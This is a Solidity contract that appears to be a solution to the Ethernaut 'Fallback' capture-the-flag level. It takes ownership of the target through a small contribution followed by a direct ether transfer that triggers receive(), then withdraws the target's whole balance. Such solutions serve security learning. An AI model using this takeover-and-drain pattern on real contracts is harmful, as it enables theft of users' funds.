///SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IFallback {
    function contribute() external payable;

    function getContribution() external view returns (uint256);

    function withdraw() external;
}

contract FallbackExploit {
    IFallback public implementation;

    address private owner;
    uint96 private step;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    /// @notice Constructor called at deployment of contract
    /// @dev 0.001 or more ether should be sent
    /// @param _implementation contract address of ethernaut `Fallback` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F
    constructor(IFallback _implementation) payable {
        require(msg.value >= 2, "not enough ether sent");

        owner = msg.sender;
        implementation = _implementation;
    }

    /// @notice Returns a boolean wheter the `implementation` contract has been exploited
    /// @return _isExploitComplete Boolean showing the state of `implementation` exploit
    function exploited() external view returns (bool _isExploitComplete) {
        _isExploitComplete = step == 3;
    }

    /// @notice First step: contribute ether greater than 0 and less than 0.001 ether
    function exploit1() external onlyOwner {
        require(step == 0);
        _incrementStep();

        uint256 initContribution = 1;
        implementation.contribute{value: initContribution}();
        assert(implementation.getContribution() == initContribution);
    }

    /// @notice Second step: send ether to `implementation` contract to trigger `receive()` function
    function exploit2() external onlyOwner {
        require(step == 1);
        _incrementStep();

        (bool sent, ) = address(implementation).call{value: 1}("");
        require(sent, "failed to send ether");
    }

    /// @notice Third step: withdraw `implementation` contract's balance as the new owner 😎
    function exploit3() external onlyOwner {
        require(step == 2);
        _incrementStep();

        uint256 cachedBalance = address(implementation).balance +
            address(this).balance;

        implementation.withdraw();
        (bool success, ) = (msg.sender).call{value: cachedBalance}("");
        require(success, "failed to withdraw ether");
    }

    /// @notice Increments `step` value by one when an exploit function is called
    function _incrementStep() private {
        unchecked {
            ++step;
        }
    }

    /// @notice Called when ether is sent to this contract
    receive() external payable {}

    /// @notice Called when ether is sent to this contract alongside some bytes data
    fallback() external payable {}
}
